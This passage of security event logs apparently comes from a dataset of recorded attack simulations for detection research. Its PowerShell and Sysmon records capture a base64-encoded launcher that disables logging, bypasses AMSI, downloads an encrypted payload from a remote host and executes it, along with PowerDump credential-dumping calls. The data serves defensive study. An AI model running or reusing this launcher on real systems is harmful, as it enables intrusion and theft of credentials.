SQBGACgAJABQAFMAVgBlAFIAcwBJAE8AbgBUAEEAYgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0ARwBlACAAMwApAHsAJABBAEMARQA2AD0AWwByAEUAZgBdAC4AQQBzAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAEEAYwBlADYAKQB7ACQANABjADAARAA9ACQAQQBjAGUANgAuAEcARQB0AFYAYQBMAFUAZQAoACQATgBVAEwAbAApADsASQBmACgAJAA0AGMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQANABjADAAZABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0AEMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAGwAPQBbAEMAbwBMAEwAZQBDAHQAaQBPAE4AcwAuAEcAZQBuAEUAUgBpAEMALgBEAEkAQwB0AEkAbwBOAEEAUgB5AFsAUwB0AFIAaQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBqAGUAQwBUAF0AXQA6ADoATgBlAHcAKAApADsAJABWAEEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAGEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADQAQwAwAGQAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAEwAfQBFAGwAUwBFAHsAWwBTAGMAcgBJAFAAVABCAEwAbwBDAEsAXQAuACIARwBFAFQARgBpAEUAYABMAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBsAFUAZQAoACQAbgBVAGwATAAsACgATgBlAFcALQBPAGIAagBFAEMAVAAgAEMATwBsAEwAZQBDAHQASQBPAG4AUwAuAEcARQBOAEUAcgBpAGMALgBIAGEAUwBoAFMAZQBUAFsAcwBUAFIASQBOAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAEUARgBdAC4AQQBzAHMARQBNAGIATAB5AC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAEUAVABGAGkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQAbgBVAEwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAFMAVABFAE0ALgBOAEUAVAAuAFMARQBSAFYASQBDAEUAUABvAEkAbgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQB4AHAAZQBjAFQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAMAA5ADcAQwA9AE4AZQBXAC0ATwBiAGoAZQBDAFQAIABTAHkAcwB0AGUATQAuAE4ARQBUAC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVAByAGkAbgBHACgAWwBDAG8ATgBWAEUAUgBUAF0AOgA6AEYAUgBPAG0AQgBhAHMAZQA2ADQAUwBUAFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADAAOQA3AEMALgBIAGUAQQBEAGUAUgBzAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAAwADkANwBjAC4AUABSAG8AeABZAD0AWwBTAHkAUwB0AGUAbQAuAE4AZQBUAC4AVwBlAGIAUgBFAHEAdQBFAHMAdABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAeQA7ACQAMAA5ADcAYwAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBuAFQAaQBhAEwAUwAgAD0AIABbAFMAWQBzAHQARQBtAC4ATgBFAFQALgBDAHIAZQBEAEUAbgB0AEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAEUARgBhAFUATAB0AE4ARQB0AHcAbwByAGsAQwByAGUAZABlAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADAAOQA3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAFQAZQBtAC4AVABFAFgAVAAuAEUATgBjAE8AZABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAHkAVABFAFMAKAAnADQARwBMAHkAXwA2ADwAKgBpAGYAcgA+AE0AVwB9AEkAKQBVAHAAdgB4AEAASwB1AFMAfgAzAGwAZABZADgAawAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkADAAOQA3AEMALgBIAEUAQQBkAGUAUgBzAC4AQQBEAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAG0AZABKAGYASAByAFUAPQBHAGgAagBOAGQAUABCADIATABEAE0ALwBpAG8ATgBXAFQAOABWAEkAVwBXAFcAaABOAGwAQQA9ACIAKQA7ACQARABBAHQAYQA9ACQAMAA5ADcAQwAuAEQATwBXAG4ATABPAEEARABEAGEAVABBACgAJABzAEUAUgArACQAdAApADsAJABpAHYAPQAkAGQAQQB0AEEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAGQAQQBUAEEALgBsAGUATgBHAHQASABdADsALQBKAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = 50f3d352-332d-4cc2-9811-b903295a8adb\r\n        Pipeline ID = 1\r\n        Command Name = New-Object\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 28398\r\n        User = THESHIRE\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","SourceName":"Microsoft-Windows-PowerShell","Version":1,"Category":"Executing Pipeline","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":-9223372036854775808,"SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":23,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","ProcessGuid":"{b34bc01c-a92a-5f69-7e02-000000000900}","ThreadID":4048,"EventType":"INFO","Opcode":"Info","EventTime":"2020-09-22 04:22:43","@timestamp":"2020-09-22T08:22:44.398Z","TargetFilename":"C:\\Users\\pgustavo\\AppData\\Local\\Temp\\avdbqyi5\\avdbqyi5.dll","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3399382,"IsExecutable":"true","Task":23,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","Severity":"INFO","User":"THESHIRE\\pgustavo","Archived":"true","Hashes":"SHA1=779AF81E8E3C093B132BFD9260125649B2E9E4E5,MD5=179D97CB513F0635188D9B360DF9788B,SHA256=71848DB49DABB822DF8BF337E7130BAE2CCE3DCA8F590BFF34611BB3B5ED8689,IMPHASH=DAE02F32A21E03CE65412F6E56942DAA","SourceName":"Microsoft-Windows-Sysmon","Version":5,"Image":"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","Category":"File Delete (rule: FileDelete)","UtcTime":"2020-09-22 08:22:43.460","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":0,"SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":4103,"ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","ExecutionProcessID":5972,"Channel":"Microsoft-Windows-PowerShell/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ActivityID":"{3AF69DEC-79B4-0001-3089-2A856290D601}","UserID":"S-1-5-18","ThreadID":8112,"EventType":"INFO","Opcode":"To be used when operation is just executing a method","EventTime":"2020-09-22 04:22:43","@timestamp":"2020-09-22T08:22:44.398Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":213889,"Payload":"CommandInvocation(New-Object): \"New-Object\"\r\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.CodeDom.Compiler.CompilerParameters\"\r\n","Task":106,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":20,"SourceModuleName":"eventlog","ERROR_EVT_UNRESOLVED":true,"Severity":"INFO","ContextInfo":"        Severity = Informational\r\n        Host Name = Default Host\r\n        Host Version = 5.1.18362.752\r\n        Host ID = da6e33cf-5ea5-45e8-b75b-b0fc1487af33\r\n        Host Application = C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBJAE8AbgBUAEEAYgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0ARwBlACAAMwApAHsAJABBAEMARQA2AD0AWwByAEUAZgBdAC4AQQBzAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAEEAYwBlADYAKQB7ACQANABjADAARAA9ACQAQQBjAGUANgAuAEcARQB0AFYAYQBMAFUAZQAoACQATgBVAEwAbAApADsASQBmACgAJAA0AGMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQANABjADAAZABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0AEMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAGwAPQBbAEMAbwBMAEwAZQBDAHQAaQBPAE4AcwAuAEcAZQBuAEUAUgBpAEMALgBEAEkAQwB0AEkAbwBOAEEAUgB5AFsAUwB0AFIAaQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBqAGUAQwBUAF0AXQA6ADoATgBlAHcAKAApADsAJABWAEEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAGEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADQAQwAwAGQAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAEwAfQBFAGwAUwBFAHsAWwBTAGMAcgBJAFAAVABCAEwAbwBDAEsAXQAuACIARwBFAFQARgBpAEUAYABMAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBsAFUAZQAoACQAbgBVAGwATAAsACgATgBlAFcALQBPAGIAagBFAEMAVAAgAEMATwBsAEwAZQBDAHQASQBPAG4AUwAuAEcARQBOAEUAcgBpAGMALgBIAGEAUwBoAFMAZQBUAFsAcwBUAFIASQBOAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAEUARgBdAC4AQQBzAHMARQBNAGIATAB5AC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAEUAVABGAGkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQAbgBVAEwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAFMAVABFAE0ALgBOAEUAVAAuAFMARQBSAFYASQBDAEUAUABvAEkAbgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQB4AHAAZQBjAFQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAMAA5ADcAQwA9AE4AZQBXAC0ATwBiAGoAZQBDAFQAIABTAHkAcwB0AGUATQAuAE4ARQBUAC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVAByAGkAbgBHACgAWwBDAG8ATgBWAEUAUgBUAF0AOgA6AEYAUgBPAG0AQgBhAHMAZQA2ADQAUwBUAFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADAAOQA3AEMALgBIAGUAQQBEAGUAUgBzAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAAwADkANwBjAC4AUABSAG8AeABZAD0AWwBTAHkAUwB0AGUAbQAuAE4AZQBUAC4AVwBlAGIAUgBFAHEAdQBFAHMAdABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAeQA7ACQAMAA5ADcAYwAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBuAFQAaQBhAEwAUwAgAD0AIABbAFMAWQBzAHQARQBtAC4ATgBFAFQALgBDAHIAZQBEAEUAbgB0AEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAEUARgBhAFUATAB0AE4ARQB0AHcAbwByAGsAQwByAGUAZABlAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADAAOQA3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAFQAZQBtAC4AVABFAFgAVAAuAEUATgBjAE8AZABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAHkAVABFAFMAKAAnADQARwBMAHkAXwA2ADwAKgBpAGYAcgA+AE0AVwB9AEkAKQBVAHAAdgB4AEAASwB1AFMAfgAzAGwAZABZADgAawAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkADAAOQA3AEMALgBIAEUAQQBkAGUAUgBzAC4AQQBEAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAG0AZABKAGYASAByAFUAPQBHAGgAagBOAGQAUABCADIATABEAE0ALwBpAG8ATgBXAFQAOABWAEkAVwBXAFcAaABOAGwAQQA9ACIAKQA7ACQARABBAHQAYQA9ACQAMAA5ADcAQwAuAEQATwBXAG4ATABPAEEARABEAGEAVABBACgAJABzAEUAUgArACQAdAApADsAJABpAHYAPQAkAGQAQQB0AEEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAGQAQQBUAEEALgBsAGUATgBHAHQASABdADsALQBKAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = 50f3d352-332d-4cc2-9811-b903295a8adb\r\n        Pipeline ID = 1\r\n        Command Name = New-Object\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 28400\r\n        User = THESHIRE\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","SourceName":"Microsoft-Windows-PowerShell","Version":1,"Category":"Executing Pipeline","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":36028797018963968,"SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":800,"ExecutionProcessID":0,"Channel":"Windows PowerShell","host":"wec.internal.cloudapp.net","ThreadID":0,"EventType":"INFO","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Message":"Pipeline execution details for command line:                 [PowerDump.Native]::RegCloseKey($hkey) | Out-Null\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=28407\r\n\r\n\tUserId=THESHIRE\\pgustavo\r\n\tHostName=Default Host\r\n\tHostVersion=5.1.18362.752\r\n\tHostId=da6e33cf-5ea5-45e8-b75b-b0fc1487af33\r\n\tHostApplication=C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBJAE8AbgBUAEEAYgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0ARwBlACAAMwApAHsAJABBAEMARQA2AD0AWwByAEUAZgBdAC4AQQBzAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAEEAYwBlADYAKQB7ACQANABjADAARAA9ACQAQQBjAGUANgAuAEcARQB0AFYAYQBMAFUAZQAoACQATgBVAEwAbAApADsASQBmACgAJAA0AGMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQANABjADAAZABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0AEMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAGwAPQBbAEMAbwBMAEwAZQBDAHQAaQBPAE4AcwAuAEcAZQBuAEUAUgBpAEMALgBEAEkAQwB0AEkAbwBOAEEAUgB5AFsAUwB0AFIAaQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBqAGUAQwBUAF0AXQA6ADoATgBlAHcAKAApADsAJABWAEEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAGEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADQAQwAwAGQAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAEwAfQBFAGwAUwBFAHsAWwBTAGMAcgBJAFAAVABCAEwAbwBDAEsAXQAuACIARwBFAFQARgBpAEUAYABMAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBsAFUAZQAoACQAbgBVAGwATAAsACgATgBlAFcALQBPAGIAagBFAEMAVAAgAEMATwBsAEwAZQBDAHQASQBPAG4AUwAuAEcARQBOAEUAcgBpAGMALgBIAGEAUwBoAFMAZQBUAFsAcwBUAFIASQBOAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAEUARgBdAC4AQQBzAHMARQBNAGIATAB5AC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAEUAVABGAGkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQAbgBVAEwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAFMAVABFAE0ALgBOAEUAVAAuAFMARQBSAFYASQBDAEUAUABvAEkAbgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQB4AHAAZQBjAFQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAMAA5ADcAQwA9AE4AZQBXAC0ATwBiAGoAZQBDAFQAIABTAHkAcwB0AGUATQAuAE4ARQBUAC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVAByAGkAbgBHACgAWwBDAG8ATgBWAEUAUgBUAF0AOgA6AEYAUgBPAG0AQgBhAHMAZQA2ADQAUwBUAFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADAAOQA3AEMALgBIAGUAQQBEAGUAUgBzAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAAwADkANwBjAC4AUABSAG8AeABZAD0AWwBTAHkAUwB0AGUAbQAuAE4AZQBUAC4AVwBlAGIAUgBFAHEAdQBFAHMAdABdADoAOgBEA